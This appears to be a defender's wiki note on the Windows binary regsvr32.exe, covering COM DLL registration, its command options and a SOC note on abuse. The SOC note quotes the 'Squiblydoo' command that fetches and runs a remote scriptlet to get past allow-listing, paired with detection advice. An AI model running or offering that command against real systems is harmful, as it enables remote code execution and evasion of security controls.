---
created: 2026-11-21
fullpath: 'C:\Windows\System32\regsvr32.exe'
generator:
  - claude
  - microsoftlearn
tags:
  - windows
  - executable
  - com
  - lolbin
aliases:
  - 'regsvr32.exe'
  - 'regsvr32'
url:
  - https://learn.microsoft.com/windows-server/administration/windows-commands/regsvr32
  - https://learn.microsoft.com/windows/win32/com/self-registration
---

**fullpath**:C:\Windows\System32\regsvr32.exe

# description

`regsvr32.exe` registers and unregisters DLLs as COM components by calling their exported `DllRegisterServer`, `DllUnregisterServer` or `DllInstall` functions. It is a built-in Windows command documented in the Windows Commands reference.

## simple description

> ### 2026-11-21 Claude said
> Regsvr32 loads a DLL and asks it to register (or unregister) itself in the registry so COM programs can find it. It is a signed Windows binary that exists on every system. Because it simply loads the DLL and calls an exported function, whatever code is in that function runs.
>
> **SOC NOTE**: Heavily abused for signed binary proxy execution (T1218.010), including the "Squiblydoo" technique `regsvr32 /s /n /u /i:http://host/file.sct scrobj.dll` that fetches and runs a remote COM scriptlet, bypassing allow-listing. Alert on regsvr32 with `/i:` URLs, network connections, DLLs in temp/user folders, non-.dll extensions, or parents like Office and script hosts.
>

# purpose

Registers .dll files as command components in the registry. A self-registering DLL exports `DllRegisterServer` and `DllUnregisterServer`; within `DllRegisterServer` the DLL creates its registry entries (CLSIDs, type library IDs, `InprocServer32`), and `DllUnregisterServer` removes exactly those entries.

# typical use cases

| usage | description |
| --- | --- |
| `regsvr32 schmmgmt.dll` | Register the .dll for the Active Directory Schema snap-in. |

# options

| option | description |
| --- | --- |
| `/u` | Unregisters server. |
| `/s` | Prevents displaying messages. |
| `/n` | Prevents calling **DllRegisterServer**; requires `/i`. |
| `/i:<cmdline>` | Passes an optional command-line string to **DllInstall**; with `/u` it calls **DllUninstall**. |
| `<Dllname>` | The name of the .dll file to register. |
| `/?` | Displays help at the command prompt. |
